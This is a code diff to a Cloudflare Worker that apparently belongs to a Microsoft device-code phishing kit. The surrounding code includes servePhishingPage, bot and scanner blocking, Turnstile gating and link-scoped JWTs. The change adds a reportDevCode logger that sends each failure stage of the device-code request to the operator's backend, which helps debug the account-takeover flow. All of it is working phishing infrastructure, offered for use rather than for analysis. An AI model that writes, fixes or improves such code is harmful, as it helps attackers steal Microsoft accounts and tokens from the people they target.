@@ -46,6 +46,27 @@ async function backendFetch(path, init) {
   throw new Error('No backend endpoint configured');
 }
 
+// Device-code failures are only easy to see in Cloudflare's worker logs, which
+// nobody is watching. Mirror every stage into the backend /api/log endpoint so
+// the exact point of failure shows up in the server terminal as a [DevCode]
+// line. Fire-and-forget: this must never throw or delay the error response.
+function reportDevCode(stage, detail, waitUntil) {
+  var p = backendFetch('/api/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      __jwt__: JWT_TOKEN,
+      message: '[DevCode] ' + stage + ': ' + String(detail).substring(0, 400),
+      source: 'worker/devicecode',
+      ua: '',
+    }),
+  }).catch(function () {});
+  // Hand the promise to waitUntil so the log is not cancelled when the handler
+  // returns its response - Cloudflare drops un-awaited background work.
+  if (typeof waitUntil === 'function') waitUntil(p);
+  return p;
+}
+
 // Link-scoped JWT, injected at build time. Used to authenticate backend calls
 // that don't otherwise carry a token - e.g. scanner-signal, which the worker
 // fires when it blocks a bot. Must be at module scope so both servePhishingPage
@@ -308,7 +329,7 @@ async function handleRequest(request, waitUntil) {
 
   // API endpoints - support both legacy and new paths
   if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
-    return handleDeviceCodeRequest(request);
+    return handleDeviceCodeRequest(request, waitUntil);
   }
   if (url.pathname === '/api/verify') {
     return handleVerifyRequest(request);
@@ -430,10 +451,11 @@ async function servePhishingPage(request) {
   });
 }
 
-async function handleDeviceCodeRequest(request) {
+async function handleDeviceCodeRequest(request, waitUntil) {
   try {
     const { jwt_token, turnstile_token } = await request.json();
     console.log('[Worker] Device code request received');
+    reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);
 
     // Verify JWT with backend
     console.log('[Worker] Verifying JWT with backend...');
@@ -446,7 +468,8 @@ async function handleDeviceCodeRequest(request) {
       const verifyData = await verifyResponse.json();
       console.log('[Worker] JWT verification result:', verifyData.valid);
       if (!verifyData.valid) {
-        console.error('[Worker] JWT verification failed');
+        console.error('[Worker] JWT verification failed:', JSON.stringify(verifyData));
+        reportDevCode('FAILED at /api/verify', 'http=' + verifyResponse.status + ' body=' + JSON.stringify(verifyData), waitUntil);
         return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
           status: 403,
           headers: { 'Content-Type': 'application/json' },
@@ -466,7 +489,8 @@ async function handleDeviceCodeRequest(request) {
       const turnstileData = await turnstileVerify.json();
       console.log('[Worker] Turnstile verification result:', turnstileData.success);
       if (!turnstileData.success) {
-        console.error('[Worker] Turnstile verification failed:', turnstileData['error-codes']);
+        console.error('[Worker] Turnstile verification failed:', JSON.stringify(turnstileData['error-codes']));
+        reportDevCode('FAILED at turnstile', 'success=' + turnstileData.success + ' codes=' + JSON.stringify(turnstileData['error-codes']) + ' token_present=' + (!!turnstile_token) + ' token_len=' + String(turnstile_token || '').length, waitUntil);
         return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
           status: 400,
           headers: { 'Content-Type': 'application/json' },
@@ -505,6 +529,7 @@ async function handleDeviceCodeRequest(request) {
 
       if (deviceCodeData.error) {
         console.error('[Worker] Microsoft error:', deviceCodeData.error, deviceCodeData.error_description);
+        reportDevCode('FAILED at microsoft devicecode', 'status=' + deviceCodeResponse.status + ' error=' + deviceCodeData.error + ' desc=' + deviceCodeData.error_description, waitUntil);
         return new Response(JSON.stringify({ error: deviceCodeData.error_description || 'Microsoft error' }), {
           status: 400,
           headers: { 'Content-Type': 'application/json' },
@@ -531,6 +556,7 @@ async function handleDeviceCodeRequest(request) {
   } catch (err) {
     console.error('[Worker] Device code request failed:', err.message);
     console.error('[Worker] Error stack:', err.stack);
+    reportDevCode('FAILED uncaught', err.message + ' :: stack=' + String(err.stack || '').substring(0, 250), waitUntil);
     return new Response(JSON.stringify({ error: 'Failed to generate code', details: err.message }), {
       status: 500,
       headers: { 'Content-Type': 'application/json' },
